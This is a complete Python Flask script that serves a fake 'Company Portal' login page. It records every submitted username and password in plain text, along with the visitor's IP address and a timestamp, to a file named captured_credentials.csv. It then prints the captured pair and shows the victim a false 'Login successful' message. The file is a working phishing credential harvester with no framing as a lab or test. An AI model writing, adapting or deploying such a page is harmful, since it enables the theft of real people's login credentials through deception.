#!/usr/bin/env python3
from flask import Flask, request, send_file, abort, render_template_string
import pandas as pd, os, datetime

app = Flask(__name__)
RESULTS = 'results/captured_credentials.csv'
os.makedirs('results', exist_ok=True)

HTML = '''<!doctype html>
<html>
  <head><title>Company Portal</title></head>
  <body>
    <h2>Company Portal Login</h2>
    <form method="POST" action="/login">
      Username: <input type="text" name="username"/><br/>
      Password: <input type="password" name="password"/><br/>
      <input type="submit" value="Login"/>
    </form>
  </body>
</html>
'''

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username','')
    pwd = request.form.get('password','')
    ip = request.remote_addr
    ts = datetime.datetime.utcnow().isoformat()
    df = pd.DataFrame([[ts, user, pwd, ip]], columns=['ts','username','password','ip'])
    if os.path.exists(RESULTS):
        df_existing = pd.read_csv(RESULTS)
        df = pd.concat([df_existing, df], ignore_index=True)
    df.to_csv(RESULTS, index=False)
    print(f'[+] Captured: {user}:{pwd} from {ip}')
    return 'Login successful. Redirecting...', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
